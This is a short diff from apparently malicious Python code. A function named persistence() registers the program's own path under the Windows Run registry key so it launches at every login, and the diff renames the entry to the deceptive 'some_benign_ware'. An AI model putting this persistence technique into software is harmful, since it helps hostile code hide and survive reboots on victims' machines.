@@ -203,7 +203,7 @@ def persistence():
     key = reg.HKEY_CURRENT_USER
     key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
     with reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) as open_:
-        reg.SetValueEx(open_,"some_benign_server",0,reg.REG_SZ,current_path)
+        reg.SetValueEx(open_,"some_benign_ware",0,reg.REG_SZ,current_path)
         reg.CloseKey(open_)
 
 def main_helper():
